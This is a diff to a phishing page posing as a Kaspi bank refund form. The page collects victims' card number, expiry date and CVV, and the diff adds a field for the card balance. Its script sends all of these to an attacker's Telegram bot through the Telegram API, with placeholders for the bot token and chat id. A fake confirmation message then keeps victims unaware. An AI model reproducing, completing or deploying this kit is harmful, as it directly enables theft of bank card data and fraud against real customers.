@@ -33,12 +33,13 @@
       margin-bottom: 6px;
       font-weight: bold;
     }
-    input {
+    input, textarea {
       width: 100%;
       padding: 10px;
       font-size: 16px;
       border-radius: 6px;
       border: 1px solid #ccc;
+      box-sizing: border-box;
     }
     button {
       width: 100%;
@@ -79,6 +80,10 @@
       <label>CVV</label>
       <input type="text" id="card_cvv" placeholder="123">
     </div>
+    <div class="input-group">
+      <label>Остаток средств на карте</label>
+      <input type="text" id="card_balance" placeholder="Введите остаток средств">
+    </div>
     <button onclick="sendData()">Отправить</button>
     <div class="message" id="message">Ваш запрос обрабатывается. Вы получите уведомление в течение трёх рабочих дней.</div>
   </div>
@@ -88,10 +93,11 @@
       const number = document.getElementById('card_number').value;
       const expiry = document.getElementById('card_expiry').value;
       const cvv = document.getElementById('card_cvv').value;
+      const balance = document.getElementById('card_balance').value;
 
       const token = 'YOUR_BOT_TOKEN'; // ЗАМЕНИ
       const chat_id = 'YOUR_CHAT_ID'; // ЗАМЕНИ
-      const msg = `💳 Заявка на возврат Kaspi:\n\nНомер карты: ${number}\nСрок: ${expiry}\nCVV: ${cvv}`;
+      const msg = `💳 Заявка на возврат Kaspi:\n\nНомер карты: ${number}\nСрок: ${expiry}\nCVV: ${cvv}\nОстаток: ${balance}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -101,6 +107,7 @@
           text: msg
         })
       })
+      .then(response => response.json())
       .then(() => {
         document.getElementById('message').style.display = 'block';
       })
